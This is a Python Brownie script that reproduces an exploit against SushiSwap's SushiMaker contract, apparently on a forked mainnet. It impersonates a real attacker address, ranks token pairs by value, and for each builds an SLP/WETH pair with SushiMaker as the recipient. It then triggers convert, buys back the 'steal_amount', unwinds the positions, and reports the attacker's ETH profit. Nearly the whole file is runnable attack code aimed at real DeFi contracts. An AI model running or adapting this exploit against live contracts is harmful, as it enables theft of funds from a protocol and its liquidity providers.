from brownie import ZERO_ADDRESS, accounts, interface, chain
from brownie.network import web3
import json
import math

MAX = (1 << 256)-1
weth = interface.WETH('0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2')
hacker = accounts.at('0x1925e832c22522e0d9947ee4677120b2f28e4cd4', force=True)
sushi_maker = interface.SushiMaker(
    '0x6684977bBED67e101BB80Fc07fCcfba655c0a64F')
sushi_router = interface.SushiRouter(
    '0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f')
sushi_factory = interface.IUniswapV2Factory(
    '0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac')


def main():

    # pair = interface.UniswapV2Pair(sushi_factory.getPair('0x31024A4C3e9aEeb256B825790F5cb7ac645e7cD5',
    #                                                      '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'))
    # token0 = interface.ERC20(pair.token0())
    # token1 = interface.ERC20(pair.token1())
    # good_luck(token0, token1)
    pairs = []
    with open('reports/pairs.json', 'r') as f:
        pairs = json.load(f)
    if not pairs:
        for i in range(sushi_factory.allPairsLength()):
            pair = interface.UniswapV2Pair(sushi_factory.allPairs(i))
            pairs.append({
                'token0': pair.token0(),
                'token1': pair.token1(),
                'price': get_pair_price(pair)
            })
        pairs = sorted(pairs, key=lambda x: x['price'], reverse=True)
        with open('reports/pairs.json', 'w', encoding='utf-8') as f:
            json.dump(pairs, f, indent=4)

    pairs = sorted(pairs, key=lambda x: x['price'], reverse=True)
    profit = 0
    for pair in pairs[:10]:
        try:
            t0, t1 = pair['token0'], pair['token1']
            print(f'token0={t0}, token1={t1}')
            token0 = interface.ERC20(pair['token0'])
            token1 = interface.ERC20(pair['token1'])
            profit += good_luck(token0, token1)
        except Exception as e:
            continue
    print(f'[profit] {profit}')


def get_pair_price(pair):
    token0, token1 = pair.token0(), pair.token1()
    return get_price(token0) + get_price(token1)


def get_price(token):
    pair = sushi_factory.getPair(token, weth)
    if pair == ZERO_ADDRESS:
        return 0
    elif token == weth:
        return 1
    else:
        pair = interface.UniswapV2Pair(pair)
        r0, r1, _ = pair.getReserves()
        if r0 == 0 or r1 == 0:
            return 0
        else:
            return r0 / r1 if pair.token0() == weth else r1 / r0


def good_luck(token0, token1):
    print(
        f"[before] Attacker's ETH: {web3.fromWei(hacker.balance(), 'ether')}")
    print(f"[before] Attacker's WETH: {weth.balanceOf(hacker)/1e18}")
    total_eth = hacker.balance() + weth.balanceOf(hacker)
    print(f"[before] Attacker's total ETH: {total_eth/1e18}")

    token0, token1 = (token0, token1) if token0.address < token1.address else (
        token1, token0)

    token0.approve(sushi_router, MAX, {'from': hacker})
    token1.approve(sushi_router, MAX, {'from': hacker})

    slp = interface.UniswapV2Pair(sushi_factory.getPair(token0, token1))
    slp.approve(sushi_router, MAX, {'from': hacker})

    if sushi_factory.getPair(slp, weth) == ZERO_ADDRESS:
        _, _, desired_amount0, desired_amount1 = calc_liquidity(
            token0, token1, 1_000_000)
        # Obtain some underlying token
        start_up(token1, desired_amount1)
        # print('token1:', token1.balanceOf(hacker))
        start_up(token0, desired_amount0)
        # print('token0:', token0.balanceOf(hacker))
        add_liquidity(token0, token1, hacker, amount=1_000_000)
        sushi_router.addLiquidity(
            slp, weth,
            1_000_000,
            10,
            0,
            0,
            sushi_maker,
            chain.time() + 120,
            {
                'from': hacker
            })
        steal_amount = slp.balanceOf(sushi_maker)
        sushi_maker.convert(slp, weth, {'from': hacker})
        sushi_router.swapETHForExactTokens(
            steal_amount, [weth, slp], hacker, chain.time() + 120, {'from': hacker, 'value': 1e18})
        sushi_router.removeLiquidity(token0, token1, slp.balanceOf(
            hacker), 0, 0, hacker, chain.time() + 120, {'from': hacker})
        if token0 != weth:
            sushi_router.swapExactTokensForETH(token0.balanceOf(
                hacker), 0, [token0, weth], hacker, chain.time() + 120, {'from': hacker})
        if token1 != weth:
            sushi_router.swapExactTokensForETH(token1.balanceOf(
                hacker), 0, [token1, weth], hacker, chain.time() + 120, {'from': hacker})

    print(
        f"[after] Attacker's ETH: {web3.fromWei(hacker.balance(), 'ether')}")
    print(f"[after] Attacker's WETH: {weth.balanceOf(hacker)/1e18}")
    new_total_eth = hacker.balance() + weth.balanceOf(hacker)
    print(f"[after] Attacker's total ETH: {new_total_eth/1e18}")
    return new_total_eth - total_eth


def start_up(token, amount):
    if token == weth:
        return 0
        # weth.deposit(hacker, amount)
        # return amount
    slp = interface.UniswapV2Pair(sushi_factory.getPair(weth, token))
    _r0, _r1, _ = slp.getReserves()
    reserve_in, reserve_out = (
        _r0, _r1) if weth == slp.token0() else (_r1, _r0)
    amount_in = sushi_router.getAmountIn(amount, reserve_in, reserve_out)
    sushi_router.swapETHForExactTokens(amount, [weth, token], hacker, chain.time() + 120, {
        'from': hacker,
        'value': amount_in
    })
    return amount_in


def add_liquidity(token0, token1, to, amount=0):
    _, _, desired_amount0, desired_amount1 = calc_liquidity(
        token0, token1, amount)

    sushi_router.addLiquidity(
        token0, token1, desired_amount0,
        desired_amount1,
        0,
        0,
        to,
        chain.time() + 120,
        {
            'from': hacker
        })


def calc_liquidity(token0, token1, amount):
    # calculate how many two underlying token need to add 1 liquidity
    # Base on token0, which means token1 will floating upward 10%
    slp = interface.UniswapV2Pair(sushi_factory.getPair(token0, token1))
    _r0, _r1, _ = slp.getReserves()
    r0, r1 = (
        _r0, _r1) if token0 == slp.token0() else (_r1, _r0)
    amount0, amount1 = (1, r1 / r0) if r1 > r0 else (r0 / r1, 1)
    desired_amount0, desired_amount1 = amount0, amount1
    if amount0 == 1:
        desired_amount1 = amount1 * 1.1
    else:
        desired_amount0 = amount0 * 1.1

    total_supply = slp.totalSupply()
    expect_amount0 = r0 * amount / total_supply
    expect_amount1 = r1 * amount / total_supply
    if expect_amount0 < 1 or expect_amount1 < 1:
        return math.ceil(amount0), math.ceil(amount1), math.ceil(desired_amount0), math.ceil(desired_amount1)
    else:
        return math.ceil(desired_amount1), math.ceil(expect_amount1), math.ceil(expect_amount0), math.ceil(expect_amount1 * 1.1)
